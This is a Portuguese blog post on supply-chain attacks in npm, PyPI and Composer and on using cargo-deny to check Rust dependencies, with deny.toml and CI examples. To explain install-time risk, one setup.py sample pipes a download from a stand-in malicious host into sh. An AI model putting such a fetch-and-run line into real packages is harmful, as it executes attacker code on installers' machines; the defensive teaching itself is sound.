# Semana do terror no PHP, Python e Node: como o cargo deny blinda seu projeto Rust
###### Por [@zejuniortdr](https://github.com/zejuniortdr/) em Out 23, 2026

![Cover](imgs/cover.png)

Ataques de supply chain no npm, PyPI e Composer viraram rotina. Veja como o cargo deny barra vulnerabilidades, licenças e crates abandonadas no CI.

Você conhece a cena. Segunda-feira, café na mão, e a aba de notificações do GitHub está vermelha: o Dependabot abriu onze PRs durante a madrugada, o Slack do time tem um link de CVE com nota 9.8, e o pipeline que passava na sexta agora quebra num pacote que você nunca instalou. Ele está lá na camada 4 da árvore, puxado por uma lib que puxa uma lib que puxa uma lib.

Nos últimos anos isso deixou de ser exceção e virou calendário. No Node, o [`event-stream`](https://github.com/dominictarr/event-stream/issues/116) (2018) ganhou um mantenedor novo que injetou código para roubar carteiras de Bitcoin; o [`ua-parser-js`](https://github.com/advisories/GHSA-pjwm-rvh2-c87w) (2021) foi sequestrado e passou a instalar minerador; em [setembro de 2025](https://blog.checkpoint.com/crypto/the-great-npm-heist-september-2025/), a conta de um mantenedor caiu num phishing e pacotes como `chalk` e `debug`, com mais de 2 bilhões de downloads semanais somados, foram publicados com malware; semanas depois veio o worm Shai-Hulud, e em novembro a [versão 2.0](https://blog.checkpoint.com/research/shai-hulud-2-0-inside-the-second-coming-the-most-aggressive-npm-supply-chain-attack-of-2025/) dele, que entrava por um script `preinstall`, roubava tokens e se republicava sozinho. No Python, a [`ultralytics`](https://www.reversinglabs.com/blog/compromised-ultralytics-pypi-package-delivers-crypto-coinminer) (dezembro de 2024) saiu no PyPI com um minerador embutido, depois que um ataque de injeção no GitHub Actions do projeto comprometeu o pipeline de release. No PHP, em 2023, [contas abandonadas de mantenedores no Packagist](https://blog.packagist.com/packagist-org-maintainer-account-takeover/), protegidas por senhas vazadas e sem 2FA, foram invadidas e passaram a apontar 14 pacotes (um deles com mais de 500 milhões de instalações) para forks do atacante.

E esta semana (outubro de 2026) veio lembrar que o problema tem duas caras. No dia 21, o Node.js publicou um release de segurança com dez correções. A mais séria é o [CVE-2026-111497](https://www.konfirmity.com/advisories/nodejs-october-2026-security-releases), uma escrita fora dos limites no decodificador Brotli que, segundo o advisory, permite execução remota de código. No mesmo dia, o PHP soltou patches de emergência para o **PHP2Shell** ([CVE-2026-109618 e CVE-2026-109619](https://helpnetsecurity.com/2026/10/21/php2shell-php-vulnerabilities-patched-cve-2026-109618-cve-2026-109619)): duas falhas no núcleo da linguagem, com nota 9.2 no CVSS v4.0, que envolvem corrupção de memória e um use-after-free causado por estado global obsoleto. A [Kaspersky](https://www.kaspersky.com/blog/cve-2026-109618-109619-php-vulnerabilities/56583/) relatou tentativas de exploração antes mesmo de os patches saírem; a [SentinelOne](https://www.sentinelone.com/blog/stopping-php2shell-how-sentinelone-protects-customers-from-this-attack-technique/), até o dia 21, não tinha confirmado nenhum comprometimento real.

Repare numa coisa: as falhas desta semana não vieram de pacote nenhum. São bugs de **memória** dentro do runtime, exatamente a classe de erro que ownership e borrow checker eliminam em tempo de compilação. Já os incidentes do parágrafo anterior são ataques à **cadeia de dependências**, e contra esses o compilador não ajuda em nada: é preciso processo e ferramenta. Este post é sobre o segundo problema.

Eu passei mais de duas décadas no mundo Python e web. Não escrevo isso de cima do muro: várias vezes já recebi o alerta vermelho. A pergunta que interessa é outra: **por que isso dói tanto nesses ecossistemas, e que ferramenta o Rust te dá para dormir melhor?**

## O problema estrutural (não é falta de cuidado do dev)

Três características deixam linguagens dinâmicas especialmente expostas.

**1. Árvores gigantescas.** O `node_modules` virou meme por um motivo: um projeto React "vazio" traz centenas de pacotes transitivos. Cada um é um mantenedor, uma conta que pode ser invadida, um token que pode vazar.

**2. Código arbitrário rodando na instalação.** Esse é o ponto que pouca gente encara de frente:

```json
// package.json de uma dependência qualquer, lá no fundo da árvore
{
  "name": "lib-inocente",
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
```

Compare com Python:

```python
# setup.py de um sdist: roda com SEUS privilégios no `pip install`
from setuptools import setup
import os

os.system("curl https://exemplo-malicioso.invalid/payload | sh")  # ninguém revisa isso

setup(name="lib-inocente", version="1.0.0")
```

No npm, `postinstall` roda por padrão. No pip, instalar a partir de um sdist executa o `setup.py` (ou o backend de build) na sua máquina; wheels não rodam código na instalação, mas o pip cai no sdist sempre que não acha um wheel compatível. No Composer, plugins de dependências executam código, e foi exatamente por isso que o Composer 2.2 passou a exigir o `allow-plugins` explícito.

**3. Auditoria que chega depois.** `npm audit`, `pip-audit` e `composer audit` existem e são úteis. Mas geralmente rodam *depois* do `install`, ou seja, depois que o `postinstall` já rodou. E cada ecossistema exige montar o próprio quebra-cabeça para ir além de CVE:

```bash
# Python: uma ferramenta para cada pergunta
pip install pip-audit pip-licenses pipdeptree
pip-audit                                  # vulnerabilidades
pip-licenses --fail-on="GPL;AGPL"          # licenças
pipdeptree --warn fail                     # conflitos na árvore

# Node: mesma história
npm audit --audit-level=high
npx license-checker --failOn "GPL;AGPL"
```

Funciona? Funciona. Mas são três ferramentas, três formatos de configuração, três coisas para quebrar no CI. Foi o mesmo tipo de "fadiga de tooling" que comentei no [post Cargo contra rapa](../0003-cargo-contra-rapa).

## O contraponto do Rust

O Rust é famoso pela segurança de memória: ownership e borrow checker eliminando classes inteiras de bugs, como as do PHP2Shell (se esse assunto ainda é nebuloso, comece pelo [guia de ownership para pythonistas](../0005-entendendo-ownership-rust-guia-pythonistas)). O que pouca gente comenta é que a segurança do *ecossistema* também recebeu atenção de primeira classe.

O Cargo já parte de uma base previsível:

- O `Cargo.lock` trava a árvore inteira com checksums, sem precisar de ferramenta extra.
- Versões publicadas no crates.io são **imutáveis**: dá para fazer `yank` (desaconselhar), mas não dá para substituir o conteúdo de uma versão existente.
- Existe um banco central de vulnerabilidades mantido pela comunidade, o [RustSec Advisory Database](https://rustsec.org).

Mas e se a gente pudesse ser ainda mais paranoico e travar vulnerabilidades, licenças não permitidas e pacotes abandonados antes mesmo de compilar? É aqui que entra o **cargo deny**.

## O que é o cargo deny

O [`cargo-deny`](https://github.com/EmbarkStudios/cargo-deny), mantido pela Embark Studios, é um **linter para o grafo de dependências**. Ele lê o `Cargo.lock` e o metadata do projeto e responde quatro perguntas de uma vez:

| Check | Pergunta que responde |
| ----- | --------------------- |
| `advisories` | Alguma crate da árvore tem vulnerabilidade conhecida, foi abandonada ou sofreu `yank`? |
| `licenses` | Alguma licença da árvore é incompatível com o meu projeto? |
| `bans` | Tem crate proibida, ou várias versões da mesma crate? |
| `sources` | Alguma dependência vem de registry ou repositório git que eu não autorizei? |

Uma ferramenta, um arquivo de configuração, um comando.

### Instalando e inicializando

```bash
cargo install --locked cargo-deny

# na raiz do projeto: gera um deny.toml comentado
cargo deny init

# roda todos os checks
cargo deny check

# ou só um deles
cargo deny check licenses
```

O `deny.toml` gerado pelo `init` é enorme e cheio de comentários. Abaixo, vou destrinchar seção por seção e no fim juntar tudo numa versão enxuta. Todos os trechos foram testados com o cargo-deny 0.20.2. Se você vir `version = 2` nas seções em tutoriais antigos: era o jeito de optar pelo formato novo de configuração durante a migração. Hoje esse formato é o padrão e o campo pode ficar de fora.

### Advisories: o RustSec como porteiro

```toml
[advisories]
# o banco do RustSec é baixado e atualizado a cada execução
db-urls = ["https://github.com/rustsec/advisory-db"]
# crate abandonada (aviso "unmaintained" no RustSec) quebra o check
unmaintained = "all"
# versão que o autor retirou do registry também
yanked = "deny"
ignore = [
    # exceções documentadas, com motivo e prazo, nunca silenciosas:
    # { id = "RUSTSEC-0000-0000", reason = "sem caminho de exploração; remover na v2.1" },
]
```

Para ver isso funcionando, montei um projeto de teste com uma dependência antiga de propósito, `time = "=0.1.43"`. Saída real do `cargo deny check advisories` (encurtada):

```text
error[vulnerability]: Potential segfault in the time crate
  ┌─ ./Cargo.lock:4:1
  │
4 │ time 0.1.43 registry+https://github.com/rust-lang/crates.io-index
  │ ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ security vulnerability detected
  │
  ├ ID: RUSTSEC-2020-0071
  ├ Advisory: https://rustsec.org/advisories/RUSTSEC-2020-0071
  ├ ### Impact
  │ The affected functions set environment variables without synchronization. [...]
  ├ Solution: Upgrade to >=0.2.23 (try `cargo update -p time`)
  ├ time v0.1.43
    └── demo v0.1.0

advisories FAILED
```

Repare no que vem junto: a linha exata do `Cargo.lock`, o ID do advisory, o impacto, **a solução** e o caminho no grafo até o seu crate. Se a crate vulnerável estiver lá no fundo da árvore, é esse caminho que te diz quem a puxou.

O RustSec não registra só CVE. Ele também publica avisos de crate **sem manutenção** (`unmaintained`) e de crates maliciosas. Quando apareceu o `rustdecimal` em 2022, um typosquat da crate legítima `rust_decimal` que baixava malware em pipelines de CI, ele virou o aviso `RUSTSEC-2022-0042`. Para ser justo: a crate também foi removida do crates.io, então um build novo quebraria de qualquer jeito. O ganho do advisory é outro: quem já tinha a crate em cache ou num registry espelho recebia um alerta com ID, explicação e caminho no grafo, em vez de um erro de download que ninguém entende.

E repare no `ignore`: dá para aceitar um risco conscientemente, mas isso fica **escrito no repositório, com motivo**, revisável em PR. Nada de `--ignore` perdido num script de CI.

### Licenças: o problema que Python e Node empurram com a barriga

Se o seu produto é código fechado, uma dependência GPL transitiva é um problema jurídico real. No Python, metadata de licença no PyPI é inconsistente: às vezes está no classifier, às vezes num campo livre, às vezes em lugar nenhum. No Rust, o campo `license` do `Cargo.toml` usa expressões SPDX (`MIT OR Apache-2.0`), que o cargo deny avalia diretamente. Quando o campo falta, ele escaneia os arquivos de licença da crate e só aceita o resultado acima do grau de confiança que você configurar.

```toml
[licenses]
# lista de PERMITIDAS: tudo fora dela é negado
allow = [
    "MIT",
    "Apache-2.0",
    "BSD-3-Clause",
    "ISC",
    "Unicode-3.0",
]
# quão confiante o scanner precisa estar ao ler um arquivo LICENSE
confidence-threshold = 0.9
# exceção pontual e explícita, por crate
exceptions = [
    # { allow = ["MPL-2.0"], crate = "webpki-roots" },
]

[licenses.private]
# crates internas do workspace que não vão para o crates.io
ignore = true
```

GPL, AGPL e LGPL não estão no `allow`, então qualquer crate com essas licenças, em qualquer nível da árvore, quebra o check. No mesmo projeto de teste, adicionei uma crate local com `license = "GPL-3.0-only"`:

```text
error[rejected]: failed to satisfy license requirements
  ┌─ ./lib-gpl/Cargo.toml:5:12
  │
5 │ license = "GPL-3.0-only"
  │            ━━━━━━━━━━━━
  │            │
  │            rejected: license is not explicitly allowed
  │
  ├ GPL-3.0-only - GNU General Public License v3.0 only:
  ├   - OSI approved
  ├   - FSF Free/Libre
  ├   - Copyleft
  ├ lib-gpl v0.1.0
    └── demo v0.1.0
```

O check também avisa (`license-not-encountered`) quando uma licença do `allow` não aparece em nenhuma crate da árvore, o que ajuda a manter a lista enxuta. Para descobrir o que você já tem hoje:

```bash
cargo deny list
```

Compare com Python:

```bash
# depende do metadata que cada autor preencheu (ou não)
pip-licenses --format=markdown
pip-licenses --fail-on="GNU General Public License v3 (GPLv3)"
# o nome precisa bater exatamente com a string do classifier
```

### Bans: proibindo crates e duplicatas

A seção `bans` faz dois trabalhos: manter uma lista negra explícita e barrar versões duplicadas. Tudo fica numa tabela só:

```toml
[bans]
# 1) lista negra: padronizar TLS em rustls e nunca linkar OpenSSL
deny = [
    { crate = "openssl", use-instead = "rustls", reason = "evitar dependência de lib C do sistema" },
    { crate = "openssl-sys", use-instead = "rustls" },
]
# proibir `versao = "*"` no Cargo.toml...
wildcards = "deny"
# ...sem barrar `path = "../minha-lib"` de crates internas que não são publicadas
allow-wildcard-paths = true

# 2) duplicatas
multiple-versions = "deny"
skip = [
    # duplicata conhecida e aceita até o upstream atualizar
    # { crate = "windows-sys@0.48", reason = "tokio ainda puxa a 0.48" },
]
```

O `allow-wildcard-paths` não está aí por enfeite. Dependência `path` sem `version` conta como wildcard. Sem essa linha, o primeiro `cargo deny check` num workspace com crates internas quebra com `error[wildcard]: found 1 wildcard dependency`. Descobri isso no projeto de teste deste post.

Crate abandonada é responsabilidade do `advisories` (via aviso `unmaintained` do RustSec); o `bans` é para quando **você** decide que uma crate não entra, seja por política do time, por histórico ruim ou porque já existe alternativa padronizada.

O segundo trabalho é o que eu mais gosto: **múltiplas versões**. Em projetos grandes é comum compilar duas, três, às vezes quatro versões de `syn`, `windows-sys` ou `rand`, porque cada dependência pediu uma faixa diferente. Cada cópia extra é tempo de compilação e tamanho de binário (o mesmo assunto que apareceu quando comparei o pacote da [Lambda em Rust vs Python](../0022-lambda-rust-vs-python-sqs-mysql)).

```bash
# quais crates aparecem em mais de uma versão
cargo tree -d

# quem puxa uma versão específica (árvore invertida)
cargo tree -i syn@1.0.109
```

O `cargo tree -i` é o que transforma o alerta em ação: ele mostra qual dependência sua ainda puxa a versão velha, e aí você sabe quem atualizar ou para onde abrir a issue.

Com `"deny"`, uma dependência nova que traga a quinta versão do `syn` não entra sem alguém justificar no PR. Se for barulho demais no começo, use `"warn"` e aperte depois.

### Sources: de onde vem o código

```toml
[sources]
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
allow-git = []
```

Alguém adicionou `minha-lib = { git = "https://github.com/fulano/fork" }` "só para testar"? O check quebra até o repositório entrar explicitamente no `allow-git`.

## Juntando tudo: um deny.toml enxuto

```toml
[graph]
all-features = true

[advisories]
unmaintained = "all"
yanked = "deny"
ignore = []

[licenses]
allow = ["MIT", "Apache-2.0", "BSD-3-Clause", "ISC", "Unicode-3.0"]
confidence-threshold = 0.9

[licenses.private]
ignore = true

[bans]
multiple-versions = "warn"
wildcards = "deny"
allow-wildcard-paths = true
deny = [
    { crate = "openssl", use-instead = "rustls" },
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
```

Umas 30 linhas, versionadas junto com o código, revisadas em PR como qualquer outra mudança.

## No CI: quebrou, não vai para produção

Antes do YAML, uma ironia que todo post de supply chain precisa encarar: **o seu pipeline também é cadeia de dependências**. Em março de 2025, a action `tj-actions/changed-files` ([CVE-2025-30066](https://nvd.nist.gov/vuln/detail/CVE-2025-30066)) foi comprometida, e o atacante moveu as tags de versão para um commit malicioso que despejava os secrets dos runners nos logs. Quem usava `@v45` rodou o código do atacante sem mudar uma linha. O caso `ultralytics`, lá do começo, também foi um ataque ao GitHub Actions.

Por isso, a regra é fixar as actions pelo **SHA do commit**, que é imutável, e deixar a tag num comentário:

```yaml
# .github/workflows/deny.yml
name: cargo-deny
on:
  push:
  pull_request:
  schedule:
    - cron: "0 6 * * *"   # todo dia às 06:00 UTC

permissions:
  contents: read

jobs:
  deny:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        checks:
          - advisories
          - bans licenses sources
    # advisory novo não trava PR que não mexeu em dependência
    continue-on-error: ${{ matrix.checks == 'advisories' }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: EmbarkStudios/cargo-deny-action@3c6349835b2b7b196a839186cb8b78e02f7b5f25 # v2.1.1
        with:
          command: check ${{ matrix.checks }}
```

Três decisões nesse arquivo valem explicação:

1. **SHA em vez de tag.** O Dependabot e o Renovate atualizam SHA fixado normalmente e mantêm o comentário com a versão, então você não perde atualização nenhuma.
2. **Advisories num job separado, com `continue-on-error`.** Um advisory publicado hoje pode afetar uma crate que você adicionou há seis meses. Se ele travasse todos os PRs, quem estivesse mexendo no README ficaria bloqueado por um problema que não criou. Licenças, bans e sources dependem do que o PR muda, então esses continuam bloqueando.
3. **`schedule` diário.** É ele que garante que o advisory novo apareça na terça, num job vermelho no histórico do repositório, e não quando alguém for mexer no projeto daqui a três meses.

No GitLab CI, evite compilar o cargo-deny a cada pipeline: `cargo install` compila a ferramenta inteira, rodando os `build.rs` das dependências *dela* no seu runner, e leva minutos. Baixe o binário publicado no release e confira o checksum antes de executar:

```yaml
cargo-deny:
  image: rust:1.90
  variables:
    DENY_VERSION: "0.20.2"
    DENY_SHA256: "9f12ed4c49936e09b48bf862b595cde2fe64fcbd9d74dfacac6131ca824c8d5f"
    DENY_TGZ: "cargo-deny-0.20.2-x86_64-unknown-linux-musl.tar.gz"
  script:
    - curl -sSfLO "https://github.com/EmbarkStudios/cargo-deny/releases/download/${DENY_VERSION}/${DENY_TGZ}"
    - echo "${DENY_SHA256}  ${DENY_TGZ}" | sha256sum -c -
    - tar xzf "${DENY_TGZ}" --strip-components=1
    - ./cargo-deny check
```

Compare com um pipeline Python fazendo o mesmo trabalho:

```yaml
audit:
  image: python:3.13
  script:
    - pip install pip-audit pip-licenses pipdeptree
    - pip install -r requirements.txt   # o código das deps já rodou aqui
    - pip-audit
    - pip-licenses --fail-on="GPL;AGPL"
    - pipdeptree --warn fail
```

E um detalhe que faz diferença no mundo real: **o cargo deny não compila nada.** Ele lê o `Cargo.lock` e o metadata. Rodar como primeiro job do pipeline significa barrar a dependência ruim *antes* de qualquer `build.rs` ser executado no seu runner.

## Sem fanatismo: o que o Rust *não* resolve

Seria desonesto parar aqui. O Rust também tem código arbitrário em tempo de build: `build.rs` e macros procedurais rodam na sua máquina durante o `cargo build` (falei de macros no [post sobre macros para pythonistas](../0014-macros-rust-pythonistas)). Uma crate maliciosa recém-publicada, ainda sem advisory, passa pelo cargo deny tranquilamente. Typosquatting também existe no crates.io: em setembro de 2025, as crates [`faster_log` e `async_println`](https://blog.rust-lang.org/2025/09/24/crates.io-malicious-crates-fasterlog-and-asyncprintln), cópias da legítima `fast_log`, ficaram quatro meses no ar procurando chaves privadas de carteiras Ethereum e Solana nos logs, com mais de 8 mil downloads somados antes de serem removidas.

Também é justo reconhecer que os outros ecossistemas reagiram:

- O [pnpm 10](https://github.com/pnpm/pnpm/releases/tag/v10.0.0) deixou de rodar lifecycle scripts de dependências por padrão, e o Bun só roda os de pacotes listados em `trustedDependencies`. No npm, `--ignore-scripts` existe, mas é opt-in.
- No pip, `--only-binary :all:` impede a execução de `setup.py`, e a [PEP 751](https://peps.python.org/pep-0751/) padronizou um lockfile (`pylock.toml`).
- PyPI e npm têm Trusted Publishing (publicação via OIDC, sem token de longa duração), e o PyPI publica attestations de origem ([PEP 740](https://peps.python.org/pep-0740/)). O crates.io ganhou o seu [Trusted Publishing em julho de 2025](https://blog.rust-lang.org/2025/07/11/crates-io-development-update-2025-07).

| Característica | Python (pip) | Node (npm) | Rust (cargo + cargo deny) |
| -------------- | ------------ | ---------- | ------------------------- |
| Lockfile nativo com hash | Parcial (`--require-hashes`; `pylock.toml` pela PEP 751) | Sim | Sim (`Cargo.lock`) |
| Versão publicada imutável | Sim (PyPI não permite reenvio) | Sim (com unpublish limitado) | Sim (só `yank`) |
| Código roda na instalação | Sim (sdist); não com `--only-binary` | Sim (`postinstall`); pnpm 10 bloqueia por padrão | Não; roda no build (`build.rs`, proc macros) |
| Vulnerabilidades | `pip-audit` | `npm audit` | `cargo deny check advisories` |
| Crate/pacote abandonado | Manual | Manual | Aviso `unmaintained` do RustSec |
| Licenças | `pip-licenses` (metadata irregular) | `license-checker` | SPDX + scan, `cargo deny check licenses` |
| Versões duplicadas | Não se aplica (uma versão por env) | Comum, sem barreira | `bans.multiple-versions` |
| Origem das dependências | Manual | Manual | `cargo deny check sources` |
| Ferramentas para tudo isso | 3+ | 2+ | 1 |

A diferença não é que o Rust seja imune. É que a resposta da comunidade cabe em **uma ferramenta, um arquivo e um job de CI**, enquanto em outros ecossistemas você costura soluções e torce para elas continuarem conversando entre si.

### O próximo nível

O cargo deny responde "o que está no meu grafo é conhecido como ruim?". Para os casos que ele não pega, existem duas ferramentas complementares:

- [`cargo-vet`](https://github.com/mozilla/cargo-vet), da Mozilla: registra no repositório **quem revisou** cada crate e versão, e permite importar auditorias de organizações em que você confia. É a resposta ao ataque do dia zero, porque crate nova sem revisão não entra.
- [`cargo-auditable`](https://github.com/rust-secure-code/cargo-auditable): embute a lista de dependências dentro do binário compilado. Assim dá para auditar o que está **rodando em produção**, e não só o que está no repositório.

## O que levar para o seu projeto

1. **Supply chain é problema de processo, não de linguagem.** Contas de mantenedor são invadidas no npm, no PyPI, no Packagist e no crates.io. O que muda é quão cedo e quão barato você detecta.
2. **Política escrita vence alerta solto.** Um `deny.toml` versionado transforma "acho que não usamos GPL" em uma regra que o CI cobra em todo PR.
3. **Exceção tem que ter motivo.** O `ignore` com `reason` e o `skip` documentado deixam rastro de quem aceitou qual risco e por quê.
4. **Checar antes de compilar importa.** Ler o lockfile antes de rodar `build.rs` fecha uma janela que, no Python e no Node, costuma estar aberta durante o `install`.
5. **O pipeline também é dependência.** Fixe actions por SHA e dê ao `GITHUB_TOKEN` só a permissão que o job precisa.
6. **Nenhuma ferramenta pega o ataque do dia zero.** Revisar dependência nova no PR, fixar versões e reduzir a árvore continuam sendo obrigação sua.

## Próximos passos

Pegue um projeto Rust seu, rode `cargo deny init && cargo deny check` e veja o que aparece. Aposto que a seção de licenças ou a de duplicatas vai te surpreender. Se você ainda está começando e não tem projeto Rust nenhum, o [post sobre o Cargo](../0003-cargo-contra-rapa) é o melhor ponto de partida: ele mostra a base sobre a qual o cargo deny trabalha.

---

Nenhuma linguagem é à prova de balas, mas o ferramental da comunidade Rust coloca uma porta blindada na esteira de desenvolvimento, algo que em outros ecossistemas costuma exigir gambiarra. Se você quer aprender Rust aproveitando tudo o que você já sabe de Python e construir APIs seguras de verdade, garanta sua cópia do livro [Desbravando Rust](https://desbravandorust.com.br).
